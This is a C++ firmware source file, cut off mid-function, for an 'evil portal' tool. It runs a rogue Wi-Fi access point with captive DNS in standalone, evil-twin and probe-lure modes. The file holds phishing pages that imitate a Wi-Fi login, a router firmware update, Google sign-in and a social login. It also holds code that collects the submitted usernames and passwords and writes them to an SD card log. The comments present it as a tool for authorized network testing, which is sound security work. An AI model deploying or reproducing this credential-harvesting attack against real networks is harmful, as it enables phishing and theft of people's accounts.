/**
 * @file      web_tool_evilportal.cpp
 * @brief     Evil portal (NucleoOS parity): rogue AP + captive portal for credential harvesting.
 *            Three modes: standalone (Civetta), evil-twin (Gemello), KARMA probe lure.
 *
 *            Security audit tool — for testing your own networks with permission.
 *
 *            WARNING: Only use on networks you own or have explicit permission to test.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string>
#include <vector>
#include <mutex>
#include <algorithm>

#ifdef ARDUINO
#include <WiFi.h>
#include <HTTPClient.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_netif.h>
#include <DNSServer.h>
#endif

/* ═══════════════════════════════════════════════ Built-in portal templates ═══ */

static const char *TEMPLATE_DEFAULT =
    "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "box-shadow:0 4px 20px rgba(0,0,0,.15);max-width:400px;width:90%}"
    "h2{color:#1a73e8;margin-top:0}p{color:#666;font-size:14px}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}"
    "button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;"
    "font-size:16px;cursor:pointer}button:hover{background:#1557b0}.error{color:#d93025;font-size:14px}"
    "</style></head><body><div class='card'><h2>Network Login</h2>"
    "<p>To continue using this Wi-Fi network, please verify your credentials below.</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Username or email' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form>"
    "<p style='font-size:12px;color:#999;text-align:center'>Secured connection</p></div></body></html>";

static const char *TEMPLATE_ROUTER =
    "<!DOCTYPE html><html><head><title>Router Firmware Update</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#e8e8e8;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:8px;"
    "box-shadow:0 2px 10px rgba(0,0,0,.1);max-width:420px;width:90%}"
    "h2{color:#333;border-bottom:2px solid #e0e0e0;padding-bottom:8px;margin-top:0}"
    "p{color:#555;font-size:14px}.warn{background:#fff3cd;border:1px solid #ffc107;padding:10px;"
    "border-radius:4px;font-size:13px;margin:12px 0}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}"
    "button{width:100%;padding:12px;background:#0066cc;color:white;border:none;border-radius:4px;"
    "font-size:16px;cursor:pointer}button:hover{background:#0052a3}"
    "</style></head><body><div class='card'><h2>Firmware Update</h2>"
    "<p>A critical firmware update is available for your router.</p>"
    "<div class='warn'>To apply the update, please authenticate with your router admin credentials.</div>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Admin username' required>"
    "<input type='password' name='password' placeholder='Admin password' required>"
    "<button type='submit'>Install Update</button></form>"
    "<p style='font-size:12px;color:#999;text-align:center'>Secure connection · v2.4.1</p></div></body></html>";

static const char *TEMPLATE_GOOGLE =
    "<!DOCTYPE html><html><head><title>Sign in — Google Accounts</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:'Google Sans',Roboto,sans-serif;background:#fff;display:flex;"
    "justify-content:center;align-items:center;height:100vh;margin:0}"
    ".card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:400px;width:90%}"
    "h1{font-size:24px;font-weight:400;margin:0 0 8px;text-align:center}"
    "p.sub{font-size:16px;color:#5f6368;margin:0 0 32px;text-align:center}"
    "input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;"
    "font-size:16px;box-sizing:border-box}input:focus{outline:none;border-color:#1a73e8;"
    "box-shadow:0 0 0 2px rgba(26,115,232,.2)}"
    "button{width:100%;padding:10px;margin:24px 0 0;background:#1a73e8;color:white;border:none;"
    "border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}"
    "button:hover{background:#1765cc}"
    "</style></head><body><div class='card'>"
    "<h1>Sign in</h1><p class='sub'>to continue to your account</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Email or phone' required>"
    "<input type='password' name='password' placeholder='Enter your password' required>"
    "<button type='submit'>Next</button></form></div></body></html>";

static const char *TEMPLATE_OAUTH =
    "<!DOCTYPE html><html><head><title>Sign in</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".card{background:white;padding:32px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.08);"
    "max-width:380px;width:90%;text-align:center}"
    "h2{font-size:20px;font-weight:600;margin:0 0 8px;color:#1c1e21}"
    "p{color:#606770;font-size:14px;margin:0 0 20px}"
    "input{width:100%;padding:12px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;"
    "font-size:15px;box-sizing:border-box}"
    "button{width:100%;padding:12px;margin:16px 0 0;background:#1877f2;color:white;border:none;"
    "border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}"
    "button:hover{background:#166fe5}"
    "</style></head><body><div class='card'><h2>Welcome back</h2>"
    "<p>Sign in to continue to your account</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Email address' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Sign In</button></form></div></body></html>";

static const char *SUCCESS_HTML =
    "<!DOCTYPE html><html><head><title>Connected</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "max-width:400px;text-align:center}h2{color:#188038}p{color:#666}</style></head><body>"
    "<div class='card'><h2>Connected</h2><p>You are now connected to the network.</p>"
    "<p style='font-size:12px;color:#999'>You may close this page.</p></div></body></html>";

/* ── built-in template catalog ── */
typedef struct {
    const char *name;
    const char *html;
} builtin_template_t;

static const builtin_template_t BUILTIN_TEMPLATES[] = {
    { "Default (Wi-Fi Login)",     TEMPLATE_DEFAULT },
    { "Router Update",             TEMPLATE_ROUTER  },
    { "Google Sign-In",            TEMPLATE_GOOGLE  },
    { "OAuth / Social Login",      TEMPLATE_OAUTH   },
};
#define BUILTIN_COUNT (sizeof(BUILTIN_TEMPLATES) / sizeof(BUILTIN_TEMPLATES[0]))

/* Custom pages are self-contained static login forms. IDs 0..99 are reserved for
 * firmware pages; SD pages use stable IDs 100..115 in filename order. */
#define CUSTOM_TEMPLATE_BASE 100
#define CUSTOM_TEMPLATE_MAX 16
#define CUSTOM_TEMPLATE_BYTES 65536
static const char CUSTOM_TEMPLATE_DIR[] = "/sd/data/evilportal/portals";
typedef struct {
    int id;
    std::string name;
    std::string host_path;
} custom_template_t;
static std::vector<custom_template_t> s_custom_templates;
static std::mutex s_templates_mx;
static std::string s_custom_html;
static char s_template_error[96] = "";

/* ── SSID presets ── */
static const char *SSID_PRESETS[] = {
    "Free Wi-Fi", "Free WiFi", "WiFi Guest", "Guest Wi-Fi",
    "Hotel Wi-Fi", "Coffee Shop WiFi", "Airport Free WiFi",
    "Library WiFi", "Starbucks WiFi", "McDonald's Free WiFi",
};
#define SSID_PRESET_COUNT (sizeof(SSID_PRESETS) / sizeof(SSID_PRESETS[0]))

/* ═══════════════════════════════════════════════ State ══════════════════════ */

static bool s_active = false;
static int  s_mode = EP_MODE_STANDALONE;
static char s_ssid[33] = "";
static char s_gateway[16] = "192.168.4.1";
static int  s_template_idx = 0;
static const char *s_active_template = NULL;
static int  s_clients = 0;
static uint32_t s_attempts = 0;
static uint32_t s_confirmed = 0;
static char s_error[160] = "";
static long long s_started = 0;
static bool s_dhcps_ok = false;
static int  s_probes_total = 0;
static int  s_vendor_counts[6] = {0};
static int  s_pwd_mode = EP_PWD_HIDDEN;
static bool s_verify = false;
static int  s_verified_ok = 0, s_verified_bad = 0;
static uint16_t s_auto_base_s = 0, s_auto_extended_s = 0;
static bool s_debug = false;
static char s_logpath[128] = "";
static char s_twin_bssid_str[18] = "";
static int  s_twin_channel = 0;
static bool s_twin_coherent = false;
static unsigned long s_deauth_frames = 0;
static bool s_cloning = false;
static char s_clone_name[64] = "";
static char s_clone_ssid[33] = "";
static int s_clone_bytes = 0;
static uint32_t s_clone_deadline_ms = 0;
static bool s_clone_fetching = false;
static bool s_clone_radio = false;
static bool s_karma_scanning = false;
static uint32_t s_karma_scan_end_ms = 0;
static int s_karma_channel = 1;
static uint32_t s_karma_last_hop_ms = 0;
#define KARMA_PROBE_LIMIT 32
#define KARMA_CLIENT_LIMIT 8
typedef struct {
    char ssid[33];
    int hits;
    int rssi;
    int channel;
    long long last_seen;
    char last_client[18];
    char clients[KARMA_CLIENT_LIMIT][18];
    int client_count;
} karma_probe_t;
static karma_probe_t s_karma_probes[KARMA_PROBE_LIMIT];
static int s_karma_count = 0;
static std::mutex s_karma_mx;

#define EP_RADIO_OWNER "Evil Portal"
#ifdef ARDUINO
static bool s_reconnect = false;
static bool s_sta_before_valid = false;
static wifi_config_t s_sta_before = {};
#endif

enum capture_verify_t {
    CAP_VERIFY_OFF = 0,
    CAP_VERIFY_QUEUED,
    CAP_VERIFY_CHECKING,
    CAP_VERIFY_VALID,
    CAP_VERIFY_INVALID,
    CAP_VERIFY_ERROR
};
typedef struct {
    char mac[18];           /* reserved: not populated per-capture by the current plumbing */
    char hostname[64];      /* reserved: not populated per-capture by the current plumbing */
    char url[256];
    char username[64];
    char password[64];
    long long ts;
    capture_verify_t verify;
} capture_t;
static std::vector<capture_t> s_captures;
static std::mutex s_captures_mx;
#define MAX_CAPTURES 256
static bool s_verify_running = false;
static bool s_verify_cancel = false;
static capture_t s_verify_capture;
static uint32_t s_verify_deadline_ms = 0;

static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len);
static void setup_log_path(void);
static void finish_karma_scan(void);
static void finish_clone(void);
static void finish_verification(void);
static void set_error(const char *text)
{
    snprintf(s_error, sizeof(s_error), "%s", text ? text : "");
}

static bool valid_ipv4(const char *text)
{
    if (!text || !*text) return false;
    int parts = 0;
    const char *p = text;
    while (*p) {
        char *end = NULL;
        long n = strtol(p, &end, 10);
        if (end == p || n < 0 || n > 255 || parts >= 4) return false;
        parts++;
        p = end;
        if (!*p) break;
        if (*p++ != '.') return false;
    }
    return parts == 4;
}

static bool authorized(const std::string &body)
{
    bool value = false;
    return web_json_get_bool(body, "authorized", &value) && value;
}

#ifdef ARDUINO
static DNSServer s_dns;
static bool mac_parse_ep(const char *s, uint8_t *mac);

static void save_sta_config(void)
{
    if (s_sta_before_valid) return;
    s_reconnect = WiFi.status() == WL_CONNECTED;
    s_sta_before_valid = esp_wifi_get_config(WIFI_IF_STA, &s_sta_before) == ESP_OK;
}

static void restore_sta_config(bool finished)
{
    WiFi.disconnect(false, false);
    if (s_sta_before_valid) esp_wifi_set_config(WIFI_IF_STA, &s_sta_before);
    if (s_reconnect) WiFi.reconnect();
    if (finished) { s_reconnect = false; s_sta_before_valid = false; }
}
#endif

/* ═══════════════════════════════════════════════ Form URL-decode ════════════ */

static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len)
{
    char *d = dst;
    const char *end = src + src_len;
    const char *dend = dst + dst_len - 1;
    while (src < end && d < dend) {
        if (*src == '+') { *d++ = ' '; src++; }
        else if (*src == '%' && src + 2 < end && isxdigit((unsigned char)src[1]) && isxdigit((unsigned char)src[2])) {
            char hex[3] = { src[1], src[2], 0 };
            *d++ = (char)strtol(hex, NULL, 16);
            src += 3;
        } else { *d++ = *src++; }
    }
    *d = 0;
}

/* ═══════════════════════════════════════════════ SD template catalog ══════ */

static bool valid_template_filename(const char *name)
{
    size_t n = strlen(name);
    if (n < 6 || n > 64 || name[0] == '.' || strcmp(name + n - 5, ".html")) return false;
    for (size_t i = 0; i < n; i++) {
        unsigned char c = (unsigned char)name[i];
        if (!isalnum(c) && c != '-' && c != '_' && c != '.') return false;
    }
    return strstr(name, "..") == NULL;
}

static bool valid_template_html(const std::string &html)
{
    if (html.empty() || html.size() > CUSTOM_TEMPLATE_BYTES || html.find('\0') != std::string::npos) return false;
    std::string compact;
    compact.reserve(html.size());
    for (unsigned char c : html) {
        if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue;
        compact += (char)tolower(c);
    }
    const bool form = compact.find("<form") != std::string::npos &&
        (compact.find("method='post'") != std::string::npos || compact.find("method=\"post\"") != std::string::npos || compact.find("method=post") != std::string::npos) &&
        (compact.find("action='/login'") != std::string::npos || compact.find("action=\"/login\"") != std::string::npos || compact.find("action=/login") != std::string::npos) &&
        (compact.find("name='username'") != std::string::npos || compact.find("name=\"username\"") != std::string::npos || compact.find("name=username") != std::string::npos) &&
        (compact.find("name='password'") != std::string::npos || compact.find("name=\"password\"") != std::string::npos || compact.find("name=password") != std::string::npos);
    const bool safe = compact.find("<script") == std::string::npos && compact.find("<iframe") == std::string::npos &&
        compact.find("<object") == std::string::npos && compact.find("<embed") == std::string::npos &&
        compact.find("<svg") == std::string::npos && compact.find("<math") == std::string::npos &&
        compact.find("<meta") == std::string::npos && compact.find("<base") == std::string::npos && compact.find("<link") == std::string::npos &&
        compact.find("src=") == std::string::npos && compact.find("srcset=") == std::string::npos && compact.find("href=") == std::string::npos &&
        compact.find("http:") == std::string::npos && compact.find("https:") == std::string::npos &&
        compact.find("javascript:") == std::string::npos && compact.find("vbscript:") == std::string::npos && compact.find("data:") == std::string::npos &&
        compact.find("//") == std::string::npos && compact.find('\\') == std::string::npos && compact.find('&') == std::string::npos;
    return form && safe && compact.find("<html") != std::string::npos && compact.find("</html>") != std::string::npos;
}

/* Read and validate again when selected: a card can change after the listing. */
static bool read_custom_template(const std::string &path, std::string &html)
{
    struct stat st;
    web_plat_io_lock();
    bool ok = stat(path.c_str(), &st) == 0 && S_ISREG(st.st_mode) && st.st_size > 0 && st.st_size <= CUSTOM_TEMPLATE_BYTES;
    FILE *f = ok ? fopen(path.c_str(), "rb") : NULL;
    web_plat_io_unlock();
    if (!f) return false;
    html.resize((size_t)st.st_size);
    web_plat_io_lock();
    size_t got = fread(&html[0], 1, html.size(), f);
    fclose(f);
    web_plat_io_unlock();
    return got == html.size() && valid_template_html(html);
}

static int scan_custom_templates(int *rejected = NULL)
{
    std::vector<custom_template_t> found;
    int bad = 0;
    if (web_fs_sd_mounted()) {
        std::string root;
        if (web_fs_resolve(CUSTOM_TEMPLATE_DIR, root) == 0) {
            std::vector<std::string> names;
            web_plat_io_lock();
            DIR *dir = opendir(root.c_str());
            if (dir) {
                while (struct dirent *entry = readdir(dir)) {
                    if (valid_template_filename(entry->d_name)) names.push_back(entry->d_name);
                    else if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")) bad++;
                }
                closedir(dir);
            }
            web_plat_io_unlock();
            std::sort(names.begin(), names.end());
            for (const std::string &name : names) {
                if (found.size() >= CUSTOM_TEMPLATE_MAX) { bad++; continue; }
                custom_template_t item;
                item.id = CUSTOM_TEMPLATE_BASE + (int)found.size();
                item.name = name.substr(0, name.size() - 5);
                item.host_path = root + "/" + name;
                std::string html;
                if (!read_custom_template(item.host_path, html)) { bad++; continue; }
                found.push_back(item);
            }
        }
    }
    {
        std::lock_guard<std::mutex> lk(s_templates_mx);
        s_custom_templates.swap(found);
        /* IDs stay contiguous after invalid files are omitted. */
        for (size_t i = 0; i < s_custom_templates.size(); i++) s_custom_templates[i].id = CUSTOM_TEMPLATE_BASE + (int)i;
    }
    if (bad) snprintf(s_template_error, sizeof(s_template_error), "%d invalid or unsupported SD template(s) omitted", bad);
    else s_template_error[0] = 0;
    if (rejected) *rejected = bad;
    std::lock_guard<std::mutex> lk(s_templates_mx);
    return (int)s_custom_templates.size();
}

/* ═══════════════════════════════════════════════ Captive portal handler ═════ */

static void serve_captive_html(web_req_t *r, const char *html)
{
    web_resp_html(r, 200, html);
}

static int classify_user_agent(const char *ua)
{
    if (!ua || !*ua) return 5;
    if (strstr(ua, "iPhone") || strstr(ua, "iPad") || strstr(ua, "CFNetwork")) return 0;
    if (strstr(ua, "Android")) return 1;
    if (strstr(ua, "Windows NT") || strstr(ua, "Windows")) return 2;
    if (strstr(ua, "Macintosh") || strstr(ua, "Mac OS X")) return 3;
    if (strstr(ua, "Linux") && !strstr(ua, "Android")) return 4;
    return 5;
}

static void handle_captive_request(web_req_t *r)
{
    if (!s_active) return;
    s_probes_total++;
    int vendor = classify_user_agent(r->user_agent);
    if (vendor >= 0 && vendor < 6) s_vendor_counts[vendor]++;

    if (!strcmp(r->method, "POST") && !strcmp(r->path, "/login")) {
        std::string body;
        if (!web_read_body(r, body, 2048)) {
            web_resp_html(r, 400, "<!doctype html><title>Login error</title><p>Form too large or incomplete. Go back and try again.</p>");
            return;
        }
        capture_t cap;
        memset(&cap, 0, sizeof(cap));
        cap.ts = tools_epoch();
        snprintf(cap.url, sizeof(cap.url), "%s", r->path);
        const char *p = body.c_str();
        while (*p) {
            while (*p == '&' || *p == ' ') p++;
            if (!*p) break;
            const char *pe = strchr(p, '&');
            size_t len = pe ? (size_t)(pe - p) : strlen(p);
            if (!strncmp(p, "username=", 9)) url_decode(cap.username, sizeof(cap.username), p + 9, len - 9);
            else if (!strncmp(p, "password=", 9)) url_decode(cap.password, sizeof(cap.password), p + 9, len - 9);
            p += len;
        }
        if (!cap.username[0] || !cap.password[0]) {
            web_resp_html(r, 400, "<!doctype html><title>Login error</title><p>Username and password are required. Go back and try again.</p>");
            return;
        }

        cap.verify = (s_verify && s_mode == EP_MODE_TWIN) ? CAP_VERIFY_QUEUED : CAP_VERIFY_OFF;
        bool stored = false;
        {
            std::lock_guard<std::mutex> lk(s_captures_mx);
            if (s_captures.size() < MAX_CAPTURES) {
                for (const auto &c : s_captures) {
                    if (!strcmp(c.password, cap.password) && !strcmp(c.username, cap.username)) {
                        s_confirmed++;
                        break;
                    }
                }
                s_captures.push_back(cap);
                s_attempts++;
                stored = true;
            }
        }
        if (!stored) {
            web_resp_html(r, 409, "<!doctype html><title>Capture full</title><p>Capture storage is full. Ask the test operator to clear it.</p>");
            return;
        }

#ifdef ARDUINO
        if (s_logpath[0]) {
            web_plat_io_lock();
            FILE *f = fopen(s_logpath, "a");
            web_plat_io_unlock();
            if (!f) set_error("Could not append to the SD capture log");
            else {
                fprintf(f, "%lld", (long long)cap.ts);
                const char *fields[] = {cap.username, cap.password};
                for (const char *field : fields) {
                    fputc(',', f);
                    if (*field == '=' || *field == '+' || *field == '-' || *field == '@') fputc('\'', f);
                    fputc('"', f);
                    for (const char *q = field; *q; q++) {
                        if (*q == '"') fputc('"', f);
                        fputc(*q, f);
                    }
                    fputc('"', f);
                }
                fputc('\n', f);
                fclose(f);
            }
        }
#endif
        serve_captive_html(r, SUCCESS_HTML);
        return;
    }
    /* Copy the template bytes before serving. The lifecycle (auto-stop runs on the main-loop
     * task) can null or replace s_active_template concurrently with this HTTP-task read; copying
     * up front means the send works from stable local bytes. A torn read at worst serves the
     * default page. (A full fix would guard the s_active/s_active_template/s_custom_html trio with
     * a mutex; that is left as a reviewed follow-up.) */
    std::string tpl = s_active_template ? s_active_template : TEMPLATE_DEFAULT;
    serve_captive_html(r, tpl.c_str());
}

/* ═══════════════════════════════════════════════ Vendor names ══════════════ */

static const char *vendor_name(int id)
{
    switch (id) {
        case 0: return "iOS";
        case 1: return "Android";
        case 2: return "Windows";
        case 3: return "macOS";
        case 4: return "Linux";
        default: return "Other";
    }
}

/* ═══════════════════════════════════════════════ API handler ═════════════════ */

static const char *const APPS[] = { "Evil Portal", NULL };

static void status_json(web_req_t *r)
{
    std::string j = "{\"active\":" + std::string(s_active ? "true" : "false");
    if (s_active) {
        j += ",\"mode\":" + tools_int(s_mode);
        j += ",\"ssid\":"; web_json_str(j, s_ssid);
        if (s_twin_bssid_str[0]) { j += ",\"twinBssid\":"; web_json_str(j, s_twin_bssid_str); }
        j += ",\"channel\":" + tools_int(s_twin_channel) +
            ",\"coherent\":" + std::string(s_twin_coherent ? "true" : "false") +
            ",\"deauthFrames\":" + tools_int((long long)s_deauth_frames) +
            ",\"clients\":" + tools_int(s_clients) +
            ",\"attempts\":" + tools_int(s_attempts) +
            ",\"confirmed\":" + tools_int(s_confirmed) +
            ",\"started\":" + tools_int(s_started) +
            ",\"dhcpsOk\":" + std::string(s_dhcps_ok ? "true" : "false") +
            ",\"probesTotal\":" + tools_int(s_probes_total);
        j += ",\"vendors\":{";
        for (int i = 0; i < 6; i++) {
            if (i) j += ",";
            j += "\"" + std::string(vendor_name(i)) + "\":" + tools_int(s_vendor_counts[i]);
        }
        j += "}";
    }
    if (s_error[0]) { j += ",\"error\":"; web_json_str(j, s_error); }
    /* Templates: builtins plus validated files that persist on the SD card. */
    if (!s_active) scan_custom_templates();
    j += ",\"templates\":[";
    for (size_t i = 0; i < BUILTIN_COUNT; i++) {
        if (i) j += ",";
        j += "{\"id\":" + tools_int((long long)i) + ",\"name\":";
        web_json_str(j, BUILTIN_TEMPLATES[i].name);
        j += ",\"builtin\":true}";
    }
    {
        std::lock_guard<std::mutex> lk(s_templates_mx);
        for (const custom_template_t &item : s_custom_templates) {
            j += ",{\"id\":" + tools_int(item.id) + ",\"name\":";
            web_json_str(j, item.name.c_str());
            j += ",\"builtin\":false,\"source\":\"sd\"}";
        }
    }
    j += "],\"templateError\":";
    if (s_template_error[0]) web_json_str(j, s_template_error); else j += "null";
    j += ",\"karmaScanning\":" + std::string(s_karma_scanning ? "true" : "false");
    j += ",\"cloning\":" + std::string(s_cloning ? "true" : "false");
    j += ",\"cloneName\":"; web_json_str(j, s_clone_name);
    j += ",\"cloneSsid\":"; web_json_str(j, s_clone_ssid);
    j += ",\"cloneBytes\":" + tools_int(s_clone_bytes);
    /* SSID presets */
    j += ",\"ssidPresets\":[";
    for (size_t i = 0; i < SSID_PRESET_COUNT; i++) {
        if (i) j += ",";
        web_json_str(j, SSID_PRESETS[i]);
    }
    j += "]";
    /* Settings */
    j += ",\"settings\":{";
    j += "\"gateway\":"; web_json_str(j, s_gateway);
    j += ",\"pwdMode\":" + tools_int(s_pwd_mode);
    j += ",\"verify\":" + std::string(s_verify ? "true" : "false");
    j += ",\"verifiedOk\":" + tools_int(s_verified_ok);
    j += ",\"verifiedBad\":" + tools_int(s_verified_bad);
    j += ",\"autoStopBase\":" + tools_int(s_auto_base_s);
    j += ",\"autoStopExtended\":" + tools_int(s_auto_extended_s);
    j += ",\"debug\":" + std::string(s_debug ? "true" : "false");
    j += ",\"logPath\":"; web_json_str(j, s_logpath);
    j += "}";
    j += "}";
    web_resp_json(r, 200, j);
}

/* ── Shared portal lifecycle (HTTP and native watch UI) ── */

static int portal_begin(int mode, const char *ssid, int template_idx, const char *gateway,
                        const char *twin_bssid, int channel, bool coherent, const char *psk = NULL)
{
    if (s_active || s_karma_scanning || s_cloning) {
        set_error(s_active ? "Portal already running" : s_cloning ? "Stop page cloning first" : "Stop probe discovery first");
        return 409;
    }
    if (coherent && mode != EP_MODE_TWIN) { set_error("WPA2 security is only valid in twin mode"); return 400; }
    if (coherent && (!psk || strlen(psk) < 8 || strlen(psk) > 63)) {
        set_error("WPA2 twin requires the authorized lab AP PSK (8-63 ASCII bytes)"); return 400;
    }
    if (psk) {
        for (const unsigned char *p = (const unsigned char *)psk; *p; p++) if (*p < 32 || *p > 126) {
            set_error("WPA2 PSK must contain printable ASCII only"); return 400;
        }
    }
    if (!ssid || !*ssid || strlen(ssid) > 32) { set_error("SSID must be 1-32 UTF-8 bytes"); return 400; }

    std::string selected_html;
    if (template_idx >= 0 && template_idx < (int)BUILTIN_COUNT) {
        selected_html = BUILTIN_TEMPLATES[template_idx].html;
    } else {
        custom_template_t selected = {};
        bool found = false;
        {
            std::lock_guard<std::mutex> lk(s_templates_mx);
            for (const custom_template_t &item : s_custom_templates) {
                if (item.id == template_idx) { selected = item; found = true; break; }
            }
        }
        if (!found || !read_custom_template(selected.host_path, selected_html)) {
            set_error("Unknown, changed or invalid SD portal template"); return 400;
        }
    }
    if (channel < 1 || channel > 13) { set_error("Channel must be 1-13"); return 400; }
    if (gateway && *gateway) {
        if (!valid_ipv4(gateway)) { set_error("Gateway must be a valid IPv4 address"); return 400; }
        snprintf(s_gateway, sizeof(s_gateway), "%s", gateway);
    }
    if (!valid_ipv4(s_gateway)) snprintf(s_gateway, sizeof(s_gateway), "192.168.4.1");
    if (mode == EP_MODE_TWIN && (!twin_bssid || strlen(twin_bssid) != 17)) {
        set_error("Twin mode requires a target BSSID"); return 400;
    }

    std::string radio_error;
    if (!tools_wifi_claim(EP_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    set_error("");
    s_mode = mode;
    snprintf(s_ssid, sizeof(s_ssid), "%s", ssid);
    s_template_idx = template_idx;
    s_custom_html = selected_html;
    s_active_template = s_custom_html.c_str();
    s_started = tools_epoch();
    s_attempts = s_confirmed = 0;
    s_clients = s_probes_total = 0;
    memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
    s_verified_ok = s_verified_bad = 0;
    s_deauth_frames = 0;
    s_twin_channel = channel;
    s_twin_coherent = coherent;
    if (mode == EP_MODE_TWIN) snprintf(s_twin_bssid_str, sizeof(s_twin_bssid_str), "%s", twin_bssid);
    else s_twin_bssid_str[0] = 0;
    s_logpath[0] = 0;

#ifdef ARDUINO
    IPAddress gw;
    if (!gw.fromString(s_gateway)) {
        tools_wifi_release(EP_RADIO_OWNER);
        set_error("Invalid gateway IPv4 address");
        return 400;
    }
    save_sta_config();
    WiFi.mode(WIFI_AP_STA);
    if (!WiFi.softAPConfig(gw, gw, IPAddress(255, 255, 255, 0)) ||
        !WiFi.softAP(ssid, coherent ? psk : NULL, channel, 0, 4)) {
        WiFi.softAPdisconnect(true);
        tools_wifi_release(EP_RADIO_OWNER);
        restore_sta_config(true);
        set_error("Could not start the captive access point");
        return 500;
    }
    if (!s_dns.start(53, "*", gw)) {
        WiFi.softAPdisconnect(true);
        tools_wifi_release(EP_RADIO_OWNER);
        restore_sta_config(true);
        set_error("Captive DNS server could not start");
        return 500;
    }
    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    esp_netif_dhcp_status_t dhcp_status = ESP_NETIF_DHCP_STOPPED;
    s_dhcps_ok = ap && esp_netif_dhcps_get_status(ap, &dhcp_status) == ESP_OK && dhcp_status == ESP_NETIF_DHCP_STARTED;
    if (!s_dhcps_ok) set_error("Portal started, but its DHCP server is not running");
#else
    s_dhcps_ok = true;                     /* simulator has no real DHCP server */
#endif
    s_active = true;
    setup_log_path();
    return 0;
}

static void portal_finish(void)
{
    finish_verification();
    s_active = false;
    s_active_template = NULL;
#ifdef ARDUINO
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    restore_sta_config(true);
#endif
    s_clients = 0;
    tools_wifi_release(EP_RADIO_OWNER);
}

/* ── Start: standalone ── */

static void start_standalone(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, ssid, gateway;
    double template_idx = 0;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", ssid);
    web_json_get_str(body, "gateway", gateway);
    if (web_json_has(body, "templateId") && !web_json_get_num(body, "templateId", &template_idx)) {
        web_resp_error(r, 400, "bad_request", "templateId must be a number"); return;
    }
    if (!authorized(body)) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    if (ssid.empty()) ssid = "Free Wi-Fi";
    int rc = portal_begin(EP_MODE_STANDALONE, ssid.c_str(), (int)template_idx,
                          gateway.empty() ? NULL : gateway.c_str(), NULL, 1, false);
    if (rc) { web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "ap_failed", s_error); return; }
    std::string j = "{\"ok\":true,\"ssid\":";
    web_json_str(j, s_ssid);
    j += ",\"mode\":\"standalone\"}";
    web_resp_json(r, 200, j);
}

/* ── Start: evil-twin ── */

static void start_twin(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, ssid, bssid, gateway;
    double channel = 1, template_idx = 0;
    bool coherent = false;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", ssid);
    web_json_get_str(body, "bssid", bssid);
    web_json_get_str(body, "gateway", gateway);
    std::string psk;
    web_json_get_str(body, "psk", psk);
    if (web_json_has(body, "templateId") && !web_json_get_num(body, "templateId", &template_idx)) {
        web_resp_error(r, 400, "bad_request", "templateId must be a number"); return;
    }
    if (web_json_has(body, "channel") && !web_json_get_num(body, "channel", &channel)) {
        web_resp_error(r, 400, "bad_request", "channel must be a number"); return;
    }
    web_json_get_bool(body, "coherent", &coherent);
    if (!authorized(body)) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    if (ssid.empty() || bssid.empty()) {
        web_resp_error(r, 400, "bad_request", "ssid and bssid are required for twin mode"); return;
    }
    uint8_t bytes[6];
    int used = 0;
    if (sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx%n",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5], &used) != 6 || used != 17) {
        web_resp_error(r, 400, "bad_request", "invalid BSSID format"); return;
    }
